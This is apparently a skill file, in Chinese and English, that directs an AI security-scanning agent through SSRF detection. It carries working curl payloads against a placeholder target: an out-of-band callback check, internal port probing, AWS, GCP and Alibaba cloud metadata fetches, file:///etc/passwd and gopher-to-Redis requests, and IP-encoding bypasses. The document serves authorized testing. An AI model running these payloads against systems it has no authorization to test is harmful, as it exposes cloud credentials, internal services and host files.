---
name: ssrf
description: "SSRF (服务端请求伪造) 检测。Use when: 目标接受 URL 作为参数 — webhook、文件导入、图片/头像URL、回调地址"
allowed-tools:
  - execute
  - http_request
  - create_candidate_finding
  - confirm_finding
  - reject_finding
  - request_approval
phase: scan
disable_model_invocation: false
---

# SSRF 检测流程

## Step 1: URL 参数发现

从应用模型中提取所有接受 URL 的参数：`?url=`, `?redirect=`, `?callback=`, `?webhook=`, `?return=`, `?image=`, `?avatar=`, `?file=`, `?import=`, `?fetch=`, `?proxy=`

## Step 2: 确认原语

```bash
CALLBACK="https://your-collaborator.oastify.com"
curl -sk "https://TARGET/fetch?url=$CALLBACK/test"
# 如果 Callback 收到请求 → SSRF 确认
```

独立模式无外网回调时用时序推断：
```bash
# 已知开放端口 → 快速响应; 关闭端口 → 连接被拒 (快速)
time curl -sk "https://TARGET/fetch?url=http://127.0.0.1:80/" 
time curl -sk "https://TARGET/fetch?url=http://127.0.0.1:12345/" # 大概率关闭
# 响应时间差异 > 1s → 端口可能开放
```

## Step 3: 内部探测

```bash
# 常见内部服务
for port in 22 80 443 3306 6379 8080 9200 27017; do
  time curl -sk "https://TARGET/fetch?url=http://127.0.0.1:$port/" --connect-timeout 3
done
```

## Step 4: 云元数据

```bash
# AWS
curl -sk "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
# GCP
curl -sk "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
# 阿里云
curl -sk "https://TARGET/fetch?url=http://100.100.100.200/latest/meta-data/"
```

云元数据可访问 → `create_candidate_finding(severity="critical", title="SSRF → 云凭证泄露")`

## Step 5: 协议与绕过

```bash
# file://
curl -sk "https://TARGET/fetch?url=file:///etc/passwd"

# gopher:// (攻击内网 Redis/MySQL)
curl -sk "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_INFO"

# IP 绕过
curl -sk "https://TARGET/fetch?url=http://2130706433/"      # 十进制
curl -sk "https://TARGET/fetch?url=http://0x7f000001/"      # 十六进制
curl -sk "https://TARGET/fetch?url=http://localhost%00.example.com/" # null byte
```
